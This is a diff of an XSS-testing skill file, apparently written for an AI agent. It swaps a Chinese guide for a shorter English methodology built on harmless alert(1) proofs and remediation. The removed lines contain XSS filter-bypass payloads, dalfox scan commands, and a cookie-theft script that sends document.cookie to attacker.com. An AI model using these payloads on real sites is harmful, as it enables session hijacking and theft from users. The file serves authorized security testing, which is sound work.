@@ -1,135 +1,55 @@
 ---
 name: xss-testing
-description: XSS跨站脚本攻击测试的专业技能
+description: Professional skills and methodology for XSS testing
 version: 1.0.0
 ---
 
-# XSS测试技能
+# XSS Testing
 
-## 概述
+## Overview
 
-跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。
+Cross-Site Scripting (XSS) occurs when untrusted input is rendered in a browser without proper context-aware encoding or sanitization.
 
-## XSS类型
+## Types
 
-### 1. 反射型XSS (Reflected XSS)
-- 恶意脚本通过URL参数传递
-- 服务器直接返回包含脚本的响应
-- 需要用户点击恶意链接
+- Reflected XSS.
+- Stored XSS.
+- DOM-based XSS.
+- Blind XSS.
+- Mutation XSS.
 
-### 2. 存储型XSS (Stored XSS)
-- 恶意脚本存储在服务器（数据库、文件等）
-- 所有访问受影响页面的用户都会执行脚本
-- 影响范围更大
+## Testing Method
 
-### 3. DOM型XSS (DOM-based XSS)
-- 客户端JavaScript处理用户输入不当
-- 不涉及服务器端处理
-- 通过修改DOM结构触发
+1. Identify input points and output locations.
+2. Establish reflection/storage behavior.
+3. Determine output context: HTML body, attribute, JavaScript, CSS, URL, or DOM sink.
+4. Use harmless proof payloads.
+5. Test encoding, sanitization, CSP, and template behavior.
+6. Confirm impact without stealing real cookies or sensitive data.
+7. Preserve request/response, rendered context, and screenshot if useful.
 
-## 测试方法
+## Example Payload Classes
 
-### 基础Payload
-```javascript
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
-<body onload=alert('XSS')>
+```html
+<script>alert(1)</script>
+"><svg onload=alert(1)>
+javascript:alert(1)
 ```
 
-### 绕过过滤
+Use only authorized targets and adapt to context.
 
-#### 大小写绕过
-```javascript
-<ScRiPt>alert('XSS')</ScRiPt>
-```
+## Evidence Requirements
 
-#### 编码绕过
-```javascript
-%3Cscript%3Ealert('XSS')%3C/script%3E
-&#60;script&#62;alert('XSS')&#60;/script&#62;
-```
+- Input parameter and sink location.
+- Payload and rendered output.
+- Browser execution proof.
+- Affected user role and exploit conditions.
+- Business impact and remediation.
 
-#### 事件处理器
-```javascript
-<img src=x onerror=alert(String.fromCharCode(88,83,83))>
-<div onmouseover=alert('XSS')>hover</div>
-<input onfocus=alert('XSS') autofocus>
-```
+## Remediation
 
-#### 伪协议
-```javascript
-<a href="javascript:alert('XSS')">click</a>
-<iframe src="javascript:alert('XSS')">
-```
-
-### 高级绕过技术
-
-#### 使用String.fromCharCode
-```javascript
-<script>alert(String.fromCharCode(88,83,83))</script>
-```
-
-#### 使用eval和atob
-```javascript
-<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
-```
-
-#### 使用HTML实体
-```javascript
-&#60;script&#62;alert('XSS')&#60;/script&#62;
-```
-
-## 工具使用
-
-### dalfox
-```bash
-# 基础扫描
-dalfox url "http://target.com/page?q=test"
-
-# 指定参数
-dalfox url "http://target.com/page" -d "q=test" -X POST
-
-# 使用自定义payload
-dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
-```
-
-### Burp Suite
-- 使用Intruder模块进行批量测试
-- 使用Repeater手动测试
-- 使用Scanner自动检测
-
-### 浏览器控制台
-- 测试DOM型XSS
-- 检查JavaScript执行环境
-- 调试payload
-
-## 验证和利用
-
-### 验证步骤
-1. 确认payload被执行
-2. 检查是否被过滤或编码
-3. 测试不同上下文（HTML、JavaScript、属性等）
-4. 评估影响（Cookie窃取、会话劫持等）
-
-### 利用场景
-- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
-- 键盘记录：注入键盘事件监听器
-- 钓鱼攻击：伪造登录表单
-- 会话劫持：获取用户会话token
-
-## 报告要点
-
-- XSS类型（反射/存储/DOM）
-- 触发位置和参数
-- 完整的POC
-- 影响评估
-- 修复建议（输出编码、CSP策略等）
-
-## 防护措施
-
-- 输入验证和过滤
-- 输出编码（HTML、JavaScript、URL）
-- Content Security Policy (CSP)
-- HttpOnly Cookie标志
-- 使用安全的框架和库
+- Apply context-aware output encoding.
+- Sanitize rich HTML with a proven library.
+- Avoid dangerous DOM sinks such as `innerHTML` with untrusted data.
+- Use CSP as defense-in-depth.
+- Validate inputs and enforce safe URL schemes.
